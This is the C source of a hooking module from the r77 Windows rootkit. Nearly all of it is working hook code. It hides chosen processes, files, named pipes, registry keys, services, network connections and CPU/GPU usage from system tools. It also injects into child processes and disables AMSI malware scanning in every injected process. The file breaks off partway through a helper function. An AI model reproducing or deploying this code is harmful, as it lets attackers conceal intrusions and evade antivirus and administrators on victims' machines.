#include "Hooks.h"
#include "Rootkit.h"
#include "Config.h"
#include "r77def.h"
#include "r77win.h"
#include "ntdll.h"
#include "detours.h"
#include <Shlwapi.h>
#include <wchar.h>

static NT_NTQUERYSYSTEMINFORMATION OriginalNtQuerySystemInformation;
static NT_NTRESUMETHREAD OriginalNtResumeThread;
static NT_NTQUERYDIRECTORYFILE OriginalNtQueryDirectoryFile;
static NT_NTQUERYDIRECTORYFILEEX OriginalNtQueryDirectoryFileEx;
static NT_NTENUMERATEKEY OriginalNtEnumerateKey;
static NT_NTENUMERATEVALUEKEY OriginalNtEnumerateValueKey;
static NT_ENUMSERVICEGROUPW OriginalEnumServiceGroupW;
static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW;
static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW2;
static NT_NTDEVICEIOCONTROLFILE OriginalNtDeviceIoControlFile;
static NT_PDHGETRAWCOUNTERARRAYW OriginalPdhGetRawCounterArrayW;
static NT_PDHGETFORMATTEDCOUNTERARRAYW OriginalPdhGetFormattedCounterArrayW;
static NT_AMSISCANBUFFER OriginalAmsiScanBuffer;

static DWORD TlsNtEnumerateKeyCacheKey;
static DWORD TlsNtEnumerateKeyCacheIndex;
static DWORD TlsNtEnumerateKeyCacheI;
static DWORD TlsNtEnumerateKeyCacheCorrectedIndex;
static DWORD TlsNtEnumerateValueKeyCacheKey;
static DWORD TlsNtEnumerateValueKeyCacheIndex;
static DWORD TlsNtEnumerateValueKeyCacheI;
static DWORD TlsNtEnumerateValueKeyCacheCorrectedIndex;

VOID InitializeHooks()
{
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	InstallHook("ntdll.dll", "NtQuerySystemInformation", (LPVOID*)&OriginalNtQuerySystemInformation, HookedNtQuerySystemInformation);
	InstallHook("ntdll.dll", "NtResumeThread", (LPVOID*)&OriginalNtResumeThread, HookedNtResumeThread);
	InstallHook("ntdll.dll", "NtQueryDirectoryFile", (LPVOID*)&OriginalNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
	InstallHook("ntdll.dll", "NtQueryDirectoryFileEx", (LPVOID*)&OriginalNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
	InstallHook("ntdll.dll", "NtEnumerateKey", (LPVOID*)&OriginalNtEnumerateKey, HookedNtEnumerateKey);
	InstallHook("ntdll.dll", "NtEnumerateValueKey", (LPVOID*)&OriginalNtEnumerateValueKey, HookedNtEnumerateValueKey);
	InstallHook("advapi32.dll", "EnumServiceGroupW", (LPVOID*)&OriginalEnumServiceGroupW, HookedEnumServiceGroupW);
	InstallHook("advapi32.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExW, HookedEnumServicesStatusExW);
	InstallHook("sechost.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
	InstallHook("ntdll.dll", "NtDeviceIoControlFile", (LPVOID*)&OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
	InstallHook("pdh.dll", "PdhGetRawCounterArrayW", (LPVOID*)&OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
	InstallHook("pdh.dll", "PdhGetFormattedCounterArrayW", (LPVOID*)&OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
	InstallHook("amsi.dll", "AmsiScanBuffer", (LPVOID*)&OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
	DetourTransactionCommit();

	// Usually, ntdll.dll should be the only DLL to hook.
	// Unfortunately, the actual enumeration of services happens in services.exe - a protected process that cannot be injected.
	// EnumServiceGroupW and EnumServicesStatusExW from advapi32.dll access services.exe through RPC.
	// There is no longer one single syscall wrapper function to hook, but multiple higher level functions.
	// EnumServicesStatusA and EnumServicesStatusExA also implement the RPC, but do not seem to be used by any applications out there.

	TlsNtEnumerateKeyCacheKey = TlsAlloc();
	TlsNtEnumerateKeyCacheIndex = TlsAlloc();
	TlsNtEnumerateKeyCacheI = TlsAlloc();
	TlsNtEnumerateKeyCacheCorrectedIndex = TlsAlloc();
	TlsNtEnumerateValueKeyCacheKey = TlsAlloc();
	TlsNtEnumerateValueKeyCacheIndex = TlsAlloc();
	TlsNtEnumerateValueKeyCacheI = TlsAlloc();
	TlsNtEnumerateValueKeyCacheCorrectedIndex = TlsAlloc();
}
VOID UninitializeHooks()
{
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	UninstallHook(OriginalNtQuerySystemInformation, HookedNtQuerySystemInformation);
	UninstallHook(OriginalNtResumeThread, HookedNtResumeThread);
	UninstallHook(OriginalNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
	UninstallHook(OriginalNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
	UninstallHook(OriginalNtEnumerateKey, HookedNtEnumerateKey);
	UninstallHook(OriginalNtEnumerateValueKey, HookedNtEnumerateValueKey);
	UninstallHook(OriginalEnumServiceGroupW, HookedEnumServiceGroupW);
	UninstallHook(OriginalEnumServicesStatusExW, HookedEnumServicesStatusExW);
	UninstallHook(OriginalEnumServicesStatusExW2, HookedEnumServicesStatusExW2);
	UninstallHook(OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
	UninstallHook(OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
	UninstallHook(OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
	UninstallHook(OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
	DetourTransactionCommit();

	TlsFree(TlsNtEnumerateKeyCacheKey);
	TlsFree(TlsNtEnumerateKeyCacheIndex);
	TlsFree(TlsNtEnumerateKeyCacheI);
	TlsFree(TlsNtEnumerateKeyCacheCorrectedIndex);
	TlsFree(TlsNtEnumerateValueKeyCacheKey);
	TlsFree(TlsNtEnumerateValueKeyCacheIndex);
	TlsFree(TlsNtEnumerateValueKeyCacheI);
	TlsFree(TlsNtEnumerateValueKeyCacheCorrectedIndex);
}

static VOID InstallHook(LPCSTR dll, LPCSTR function, LPVOID *originalFunction, LPVOID hookedFunction)
{
	*originalFunction = GetFunction(dll, function);
	if (*originalFunction) DetourAttach(originalFunction, hookedFunction);
}
static VOID UninstallHook(LPVOID originalFunction, LPVOID hookedFunction)
{
	if (originalFunction && hookedFunction) DetourDetach(&originalFunction, hookedFunction);
}

static NTSTATUS NTAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS systemInformationClass, LPVOID systemInformation, ULONG systemInformationLength, PULONG returnLength)
{
	// returnLength is important, but it may be NULL, so wrap this value.
	ULONG newReturnLength;
	NTSTATUS status = OriginalNtQuerySystemInformation(systemInformationClass, systemInformation, systemInformationLength, &newReturnLength);
	if (returnLength) *returnLength = newReturnLength;

	if (NT_SUCCESS(status))
	{
		// Hide processes
		if (systemInformationClass == SystemProcessInformation)
		{
			// Accumulate CPU usage of hidden processes.
			LARGE_INTEGER hiddenKernelTime = { 0 };
			LARGE_INTEGER hiddenUserTime = { 0 };
			LONGLONG hiddenCycleTime = 0;

			for (PNT_SYSTEM_PROCESS_INFORMATION current = (PNT_SYSTEM_PROCESS_INFORMATION)systemInformation, previous = NULL; current;)
			{
				if (HasPrefixU(current->ImageName) || IsProcessIdHidden((DWORD)(DWORD_PTR)current->ProcessId) || IsProcessNameHiddenU(current->ImageName))
				{
					hiddenKernelTime.QuadPart += current->KernelTime.QuadPart;
					hiddenUserTime.QuadPart += current->UserTime.QuadPart;
					hiddenCycleTime += current->CycleTime;

					if (previous)
					{
						if (current->NextEntryOffset) previous->NextEntryOffset += current->NextEntryOffset;
						else previous->NextEntryOffset = 0;
					}
					else
					{
						if (current->NextEntryOffset) systemInformation = (LPBYTE)systemInformation + current->NextEntryOffset;
						else systemInformation = NULL;
					}
				}
				else
				{
					previous = current;
				}

				if (current->NextEntryOffset) current = (PNT_SYSTEM_PROCESS_INFORMATION)((LPBYTE)current + current->NextEntryOffset);
				else current = NULL;
			}

			// Add CPU usage of hidden processes to the System Idle Process.
			for (PNT_SYSTEM_PROCESS_INFORMATION current = (PNT_SYSTEM_PROCESS_INFORMATION)systemInformation, previous = NULL; current;)
			{
				if (current->ProcessId == 0)
				{
					current->KernelTime.QuadPart += hiddenKernelTime.QuadPart;
					current->UserTime.QuadPart += hiddenUserTime.QuadPart;
					current->CycleTime += hiddenCycleTime;
					break;
				}

				previous = current;

				if (current->NextEntryOffset) current = (PNT_SYSTEM_PROCESS_INFORMATION)((LPBYTE)current + current->NextEntryOffset);
				else current = NULL;
			}
		}
		// Hide CPU usage
		else if (systemInformationClass == SystemProcessorPerformanceInformation)
		{
			// ProcessHacker graph per CPU
			LARGE_INTEGER hiddenKernelTime = { 0 };
			LARGE_INTEGER hiddenUserTime = { 0 };
			if (GetProcessHiddenTimes(&hiddenKernelTime, &hiddenUserTime, NULL))
			{
				PNT_SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION performanceInformation = (PNT_SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION)systemInformation;
				ULONG numberOfProcessors = newReturnLength / sizeof(NT_SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION);

				for (ULONG i = 0; i < numberOfProcessors; i++)
				{
					//TODO: This works, but it needs to be on a per-cpu basis instead of x / numberOfProcessors
					performanceInformation[i].KernelTime.QuadPart += hiddenUserTime.QuadPart / numberOfProcessors;
					performanceInformation[i].UserTime.QuadPart -= hiddenUserTime.QuadPart / numberOfProcessors;
					performanceInformation[i].IdleTime.QuadPart += (hiddenKernelTime.QuadPart + hiddenUserTime.QuadPart) / numberOfProcessors;
				}
			}
		}
		// Hide CPU usage
		else if (systemInformationClass == SystemProcessorIdleCycleTimeInformation)
		{
			// ProcessHacker graph for all CPU's
			LONGLONG hiddenCycleTime = 0;
			if (GetProcessHiddenTimes(NULL, NULL, &hiddenCycleTime))
			{
				PNT_SYSTEM_PROCESSOR_IDLE_CYCLE_TIME_INFORMATION idleCycleTimeInformation = (PNT_SYSTEM_PROCESSOR_IDLE_CYCLE_TIME_INFORMATION)systemInformation;
				ULONG numberOfProcessors = newReturnLength / sizeof(NT_SYSTEM_PROCESSOR_IDLE_CYCLE_TIME_INFORMATION);

				for (ULONG i = 0; i < numberOfProcessors; i++)
				{
					idleCycleTimeInformation[i].CycleTime += hiddenCycleTime / numberOfProcessors;
				}
			}
		}
	}

	return status;
}
static NTSTATUS NTAPI HookedNtResumeThread(HANDLE thread, PULONG suspendCount)
{
	// Child process hooking:
	// When a process is created, its parent process calls NtResumeThread to start the new process after process creation is completed.
	// At this point, the process is suspended and should be injected. After injection is completed, NtResumeThread should be called.
	// To inject the process, a connection to the r77 service is performed through a named pipe.
	// Because a 32-bit process can create a 64-bit child process, injection cannot be performed here.

	DWORD processId = GetProcessIdOfThread(thread);
	if (processId != GetCurrentProcessId()) // If NtResumeThread is called on this process, it is not a child process
	{
		// Call the r77 service and pass the process ID.
		HANDLE pipe = CreateFileW(CHILD_PROCESS_PIPE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (pipe != INVALID_HANDLE_VALUE)
		{
			// Send the process ID to the r77 service.
			DWORD bytesWritten;
			WriteFile(pipe, &processId, sizeof(DWORD), &bytesWritten, NULL);

			// Wait for the response. NtResumeThread should be called after r77 is injected.
			BYTE returnValue;
			DWORD bytesRead;
			ReadFile(pipe, &returnValue, sizeof(BYTE), &bytesRead, NULL);

			CloseHandle(pipe);
		}
	}

	// This function returns, *after* injection is completed.
	return OriginalNtResumeThread(thread, suspendCount);
}
static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE fileHandle, HANDLE event, PIO_APC_ROUTINE apcRoutine, LPVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, LPVOID fileInformation, ULONG length, FILE_INFORMATION_CLASS fileInformationClass, BOOLEAN returnSingleEntry, PUNICODE_STRING fileName, BOOLEAN restartScan)
{
	NTSTATUS status = OriginalNtQueryDirectoryFile(fileHandle, event, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, returnSingleEntry, fileName, restartScan);

	// Hide files, directories and named pipes
	if (NT_SUCCESS(status) && (fileInformationClass == FileDirectoryInformation || fileInformationClass == FileFullDirectoryInformation || fileInformationClass == FileIdFullDirectoryInformation || fileInformationClass == FileBothDirectoryInformation || fileInformationClass == FileIdBothDirectoryInformation || fileInformationClass == FileNamesInformation))
	{
		WCHAR fileDirectoryPath[MAX_PATH + 1] = { 0 };
		WCHAR fileFileName[MAX_PATH + 1] = { 0 };
		WCHAR fileFullPath[MAX_PATH + 1] = { 0 };

		if (GetFileType(fileHandle) == FILE_TYPE_PIPE) StrCpyW(fileDirectoryPath, L"\\\\.\\pipe\\");
		else GetPathFromHandle(fileHandle, fileDirectoryPath, MAX_PATH);

		if (returnSingleEntry)
		{
			// When returning a single entry, skip until the first item is found that is not hidden.
			for (BOOL skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName))); skip; skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName))))
			{
				status = OriginalNtQueryDirectoryFile(fileHandle, event, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, returnSingleEntry, fileName, restartScan);
				if (status) break;
			}
		}
		else
		{
			LPVOID current = fileInformation;
			LPVOID previous = NULL;
			ULONG nextEntryOffset;

			do
			{
				nextEntryOffset = FileInformationGetNextEntryOffset(current, fileInformationClass);

				if (HasPrefix(FileInformationGetName(current, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(current, fileInformationClass, fileFileName))))
				{
					if (nextEntryOffset)
					{
						i_memcpy(
							current,
							(LPBYTE)current + nextEntryOffset,
							(ULONG)(length - ((ULONGLONG)current - (ULONGLONG)fileInformation) - nextEntryOffset)
						);
						continue;
					}
					else
					{
						if (current == fileInformation) status = STATUS_NO_MORE_FILES;
						else FileInformationSetNextEntryOffset(previous, fileInformationClass, 0);
						break;
					}
				}

				previous = current;
				current = (LPBYTE)current + nextEntryOffset;
			}
			while (nextEntryOffset);
		}
	}

	return status;
}
static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE fileHandle, HANDLE event, PIO_APC_ROUTINE apcRoutine, LPVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, LPVOID fileInformation, ULONG length, FILE_INFORMATION_CLASS fileInformationClass, ULONG queryFlags, PUNICODE_STRING fileName)
{
	NTSTATUS status = OriginalNtQueryDirectoryFileEx(fileHandle, event, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, queryFlags, fileName);

	// Hide files, directories and named pipes
	// Some applications (e.g. cmd.exe) use NtQueryDirectoryFileEx instead of NtQueryDirectoryFile.
	if (NT_SUCCESS(status) && (fileInformationClass == FileDirectoryInformation || fileInformationClass == FileFullDirectoryInformation || fileInformationClass == FileIdFullDirectoryInformation || fileInformationClass == FileBothDirectoryInformation || fileInformationClass == FileIdBothDirectoryInformation || fileInformationClass == FileNamesInformation))
	{
		WCHAR fileDirectoryPath[MAX_PATH + 1] = { 0 };
		WCHAR fileFileName[MAX_PATH + 1] = { 0 };
		WCHAR fileFullPath[MAX_PATH + 1] = { 0 };

		if (GetFileType(fileHandle) == FILE_TYPE_PIPE) StrCpyW(fileDirectoryPath, L"\\\\.\\pipe\\");
		else GetPathFromHandle(fileHandle, fileDirectoryPath, MAX_PATH);

		if (queryFlags & SL_RETURN_SINGLE_ENTRY)
		{
			// When returning a single entry, skip until the first item is found that is not hidden.
			for (BOOL skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName))); skip; skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName))))
			{
				status = OriginalNtQueryDirectoryFileEx(fileHandle, event, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, queryFlags, fileName);
				if (status) break;
			}
		}
		else
		{
			LPVOID current = fileInformation;
			LPVOID previous = NULL;
			ULONG nextEntryOffset;

			do
			{
				nextEntryOffset = FileInformationGetNextEntryOffset(current, fileInformationClass);

				if (HasPrefix(FileInformationGetName(current, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(current, fileInformationClass, fileFileName))))
				{
					if (nextEntryOffset)
					{
						i_memcpy(
							current,
							(LPBYTE)current + nextEntryOffset,
							(ULONG)(length - ((ULONGLONG)current - (ULONGLONG)fileInformation) - nextEntryOffset)
						);
						continue;
					}
					else
					{
						if (current == fileInformation) status = STATUS_NO_MORE_FILES;
						else FileInformationSetNextEntryOffset(previous, fileInformationClass, 0);
						break;
					}
				}

				previous = current;
				current = (LPBYTE)current + nextEntryOffset;
			}
			while (nextEntryOffset);
		}
	}

	return status;
}
static NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE key, ULONG index, NT_KEY_INFORMATION_CLASS keyInformationClass, LPVOID keyInformation, ULONG keyInformationLength, PULONG resultLength)
{
	if (keyInformationClass == KeyNodeInformation)
	{
		return OriginalNtEnumerateKey(key, index, keyInformationClass, keyInformation, keyInformationLength, resultLength);
	}

	HANDLE cacheKey = (HANDLE)TlsGetValue(TlsNtEnumerateKeyCacheKey);
	ULONG cacheIndex = (ULONG)TlsGetValue(TlsNtEnumerateKeyCacheIndex);
	ULONG cacheI = (ULONG)TlsGetValue(TlsNtEnumerateKeyCacheI);
	ULONG cacheCorrectedIndex = (ULONG)TlsGetValue(TlsNtEnumerateKeyCacheCorrectedIndex);

	ULONG i = 0;
	ULONG correctedIndex = 0;

	if (cacheKey == key && cacheIndex == index - 1)
	{
		// This function was recently called the index - 1, so we can continue from the last known position.
		// This increases performance from O(N^2) to O(N).
		i = cacheI;
		correctedIndex = cacheCorrectedIndex + 1;
	}

	BYTE buffer[1024];
	PNT_KEY_BASIC_INFORMATION basicInformation = (PNT_KEY_BASIC_INFORMATION)buffer;

	for (; i <= index; correctedIndex++)
	{
		if (OriginalNtEnumerateKey(key, correctedIndex, KeyBasicInformation, basicInformation, 1024, resultLength) != ERROR_SUCCESS)
		{
			return OriginalNtEnumerateKey(key, correctedIndex, keyInformationClass, keyInformation, keyInformationLength, resultLength);
		}

		if (!HasPrefix(basicInformation->Name))
		{
			i++;
		}
	}

	correctedIndex--;

	TlsSetValue(TlsNtEnumerateKeyCacheKey, key);
	TlsSetValue(TlsNtEnumerateKeyCacheIndex, index);
	TlsSetValue(TlsNtEnumerateKeyCacheI, i);
	TlsSetValue(TlsNtEnumerateKeyCacheCorrectedIndex, correctedIndex);

	return OriginalNtEnumerateKey(key, correctedIndex, keyInformationClass, keyInformation, keyInformationLength, resultLength);
}
static NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_INFORMATION_CLASS keyValueInformationClass, LPVOID keyValueInformation, ULONG keyValueInformationLength, PULONG resultLength)
{
	HANDLE cacheKey = (HANDLE)TlsGetValue(TlsNtEnumerateValueKeyCacheKey);
	ULONG cacheIndex = (ULONG)TlsGetValue(TlsNtEnumerateValueKeyCacheIndex);
	ULONG cacheI = (ULONG)TlsGetValue(TlsNtEnumerateValueKeyCacheI);
	ULONG cacheCorrectedIndex = (ULONG)TlsGetValue(TlsNtEnumerateValueKeyCacheCorrectedIndex);

	ULONG i = 0;
	ULONG correctedIndex = 0;

	if (cacheKey == key && cacheIndex == index - 1)
	{
		// This function was recently called the index - 1, so we can continue from the last known position.
		// This increases performance from O(N^2) to O(N).
		i = cacheI;
		correctedIndex = cacheCorrectedIndex + 1;
	}

	BYTE buffer[1024];
	PNT_KEY_VALUE_BASIC_INFORMATION basicInformation = (PNT_KEY_VALUE_BASIC_INFORMATION)buffer;

	for (; i <= index; correctedIndex++)
	{
		if (OriginalNtEnumerateValueKey(key, correctedIndex, KeyValueBasicInformation, basicInformation, 1024, resultLength) != ERROR_SUCCESS)
		{
			return OriginalNtEnumerateValueKey(key, correctedIndex, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
		}

		if (!HasPrefix(basicInformation->Name))
		{
			i++;
		}
	}

	correctedIndex--;

	TlsSetValue(TlsNtEnumerateValueKeyCacheKey, key);
	TlsSetValue(TlsNtEnumerateValueKeyCacheIndex, index);
	TlsSetValue(TlsNtEnumerateValueKeyCacheI, i);
	TlsSetValue(TlsNtEnumerateValueKeyCacheCorrectedIndex, correctedIndex);

	return OriginalNtEnumerateValueKey(key, correctedIndex, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
}
static BOOL WINAPI HookedEnumServiceGroupW(SC_HANDLE serviceManager, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPVOID reserved)
{
	// services.msc
	BOOL result = OriginalEnumServiceGroupW(serviceManager, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle, reserved);

	if (result && services && servicesReturned)
	{
		FilterEnumServiceStatus((LPENUM_SERVICE_STATUSW)services, servicesReturned);
	}

	return result;
}
static BOOL WINAPI HookedEnumServicesStatusExW(SC_HANDLE serviceManager, SC_ENUM_TYPE infoLevel, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPCWSTR groupName)
{
	// TaskMgr (Windows 7), ProcessHacker
	BOOL result = OriginalEnumServicesStatusExW(serviceManager, infoLevel, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle, groupName);

	if (result && services && servicesReturned)
	{
		FilterEnumServiceStatusProcess((LPENUM_SERVICE_STATUS_PROCESSW)services, servicesReturned);
	}

	return result;
}
static BOOL WINAPI HookedEnumServicesStatusExW2(SC_HANDLE serviceManager, SC_ENUM_TYPE infoLevel, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPCWSTR groupName)
{
	// TaskMgr (Windows 10 uses sechost.dll instead of advapi32.dll)
	BOOL result = OriginalEnumServicesStatusExW2(serviceManager, infoLevel, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle, groupName);

	if (result && services && servicesReturned)
	{
		FilterEnumServiceStatusProcess((LPENUM_SERVICE_STATUS_PROCESSW)services, servicesReturned);
	}

	return result;
}
static NTSTATUS NTAPI HookedNtDeviceIoControlFile(HANDLE fileHandle, HANDLE event, PIO_APC_ROUTINE apcRoutine, LPVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, ULONG ioControlCode, LPVOID inputBuffer, ULONG inputBufferLength, LPVOID outputBuffer, ULONG outputBufferLength)
{
	NTSTATUS status = OriginalNtDeviceIoControlFile(fileHandle, event, apcRoutine, apcContext, ioStatusBlock, ioControlCode, inputBuffer, inputBufferLength, outputBuffer, outputBufferLength);

	if (NT_SUCCESS(status))
	{
		// Hide TCP and UDP entries
		if (ioControlCode == IOCTL_NSI_GETALLPARAM && outputBuffer && outputBufferLength == sizeof(NT_NSI_PARAM))
		{
			// Check, if the device is "\Device\Nsi"
			BYTE deviceName[500];
			if (NT_SUCCESS(R77_NtQueryObject(fileHandle, ObjectNameInformation, deviceName, 500, NULL)) &&
				!StrCmpNIW(DEVICE_NSI, ((PUNICODE_STRING)deviceName)->Buffer, sizeof(DEVICE_NSI) / sizeof(WCHAR)))
			{
				PNT_NSI_PARAM nsiParam = (PNT_NSI_PARAM)outputBuffer;
				if (nsiParam->Entries && (nsiParam->Type == NsiTcp || nsiParam->Type == NsiUdp))
				{
					WCHAR processName[MAX_PATH + 1];

					for (DWORD i = 0; i < nsiParam->Count; i++)
					{
						PNT_NSI_TCP_ENTRY tcpEntry = (PNT_NSI_TCP_ENTRY)((LPBYTE)nsiParam->Entries + i * nsiParam->EntrySize);
						PNT_NSI_UDP_ENTRY udpEntry = (PNT_NSI_UDP_ENTRY)((LPBYTE)nsiParam->Entries + i * nsiParam->EntrySize);

						// The status and process table may be NULL.
						PNT_NSI_PROCESS_ENTRY processEntry = nsiParam->ProcessEntries ? (PNT_NSI_PROCESS_ENTRY)((LPBYTE)nsiParam->ProcessEntries + i * nsiParam->ProcessEntrySize) : NULL;
						PNT_NSI_STATUS_ENTRY statusEntry = nsiParam->StatusEntries ? (PNT_NSI_STATUS_ENTRY)((LPBYTE)nsiParam->StatusEntries + i * nsiParam->StatusEntrySize) : NULL;

						processName[0] = L'\0';

						BOOL hidden = FALSE;
						if (nsiParam->Type == NsiTcp)
						{
							if (processEntry) GetProcessFileName(processEntry->TcpProcessId, processName, MAX_PATH);

							hidden =
								IsTcpLocalPortHidden(_byteswap_ushort(tcpEntry->Local.Port)) ||
								IsTcpRemotePortHidden(_byteswap_ushort(tcpEntry->Remote.Port)) ||
								processEntry && IsProcessIdHidden(processEntry->TcpProcessId) ||
								lstrlenW(processName) > 0 && IsProcessNameHidden(processName) ||
								HasPrefix(processName);
						}
						else if (nsiParam->Type == NsiUdp)
						{
							if (processEntry) GetProcessFileName(processEntry->UdpProcessId, processName, MAX_PATH);

							hidden =
								IsUdpPortHidden(_byteswap_ushort(udpEntry->Port)) ||
								processEntry && IsProcessIdHidden(processEntry->UdpProcessId) ||
								lstrlenW(processName) > 0 && IsProcessNameHidden(processName) ||
								HasPrefix(processName);
						}

						// If hidden, move all following entries up by one and decrease count.
						if (hidden)
						{
							if (i < nsiParam->Count - 1) // Do not move following entries, if this is the last entry
							{
								memmove(tcpEntry, (LPBYTE)tcpEntry + nsiParam->EntrySize, (nsiParam->Count - i - 1) * nsiParam->EntrySize);

								if (statusEntry)
								{
									memmove(statusEntry, (LPBYTE)statusEntry + nsiParam->StatusEntrySize, (nsiParam->Count - i - 1) * nsiParam->StatusEntrySize);
								}
								if (processEntry)
								{
									memmove(processEntry, (LPBYTE)processEntry + nsiParam->ProcessEntrySize, (nsiParam->Count - i - 1) * nsiParam->ProcessEntrySize);
								}
							}

							nsiParam->Count--;
							i--;
						}
					}
				}
			}
		}
	}

	return status;
}
static PDH_STATUS WINAPI HookedPdhGetRawCounterArrayW(PDH_HCOUNTER counter, LPDWORD bufferSize, LPDWORD itemCount, PPDH_RAW_COUNTER_ITEM_W itemBuffer)
{
	PDH_STATUS status = OriginalPdhGetRawCounterArrayW(counter, bufferSize, itemCount, itemBuffer);

	if (status == ERROR_SUCCESS && itemCount && itemBuffer)
	{
		DWORD infoBufferSize = 0;
		if (PdhGetCounterInfoW(counter, FALSE, &infoBufferSize, NULL) == PDH_MORE_DATA)
		{
			PPDH_COUNTER_INFO_W info = (PPDH_COUNTER_INFO_W)NEW_ARRAY(BYTE, infoBufferSize);
			if (PdhGetCounterInfoW(counter, FALSE, &infoBufferSize, info) == ERROR_SUCCESS)
			{
				if (!StrCmpW(info->szFullPath, L"\\GPU Engine(*)\\Running Time"))
				{
					for (DWORD i = 0; i < *itemCount; i++)
					{
						if (GetIsHiddenFromPdhString(itemBuffer[i].szName))
						{
							itemBuffer[i].RawValue.FirstValue = 0;
							itemBuffer[i].RawValue.SecondValue = 0;
							itemBuffer[i].RawValue.MultiCount = 0;
						}
					}
				}
			}

			FREE(info);
		}
	}

	return status;
}
static PDH_STATUS WINAPI HookedPdhGetFormattedCounterArrayW(PDH_HCOUNTER counter, DWORD format, LPDWORD bufferSize, LPDWORD itemCount, PPDH_FMT_COUNTERVALUE_ITEM_W itemBuffer)
{
	PDH_STATUS status = OriginalPdhGetFormattedCounterArrayW(counter, format, bufferSize, itemCount, itemBuffer);

	if (status == ERROR_SUCCESS && itemCount && itemBuffer)
	{
		DWORD infoBufferSize = 0;
		if (PdhGetCounterInfoW(counter, FALSE, &infoBufferSize, NULL) == PDH_MORE_DATA)
		{
			PPDH_COUNTER_INFO_W info = (PPDH_COUNTER_INFO_W)NEW_ARRAY(BYTE, infoBufferSize);
			if (PdhGetCounterInfoW(counter, FALSE, &infoBufferSize, info) == ERROR_SUCCESS)
			{
				if (!StrCmpW(info->szFullPath, L"\\GPU Engine(*)\\Utilization Percentage"))
				{
					for (DWORD i = 0; i < *itemCount; i++)
					{
						if (GetIsHiddenFromPdhString(itemBuffer[i].szName))
						{
							itemBuffer[i].FmtValue.longValue = 0;
							itemBuffer[i].FmtValue.doubleValue = 0;
							itemBuffer[i].FmtValue.largeValue = 0;
						}
					}
				}
			}

			FREE(info);
		}
	}

	return status;
}
static HRESULT WINAPI HookedAmsiScanBuffer(LPVOID amsiContext, LPVOID buffer, ULONG length, LPCWSTR contentName, LPVOID amsiSession, LPDWORD result)
{
	// Bypass AMSI in every process that is injected with r77.

	return 0x80070057;
}

static BOOL GetProcessHiddenTimes(PLARGE_INTEGER hiddenKernelTime, PLARGE_INTEGER hiddenUserTime, PLONGLONG hiddenCycleTime)
{
	// Count hidden CPU usage explicitly instead of waiting for a call to NtQuerySystemInformation(SystemProcessInformation).
	// Task managers call NtQuerySystemInformation(SystemProcessInformation) also, but not necessarily in a matching frequency.

	BOOL result = FALSE;
	LPBYTE systemInformation = NEW_ARRAY(BYTE, 1024 * 1024 * 2);
	ULONG returnLength;

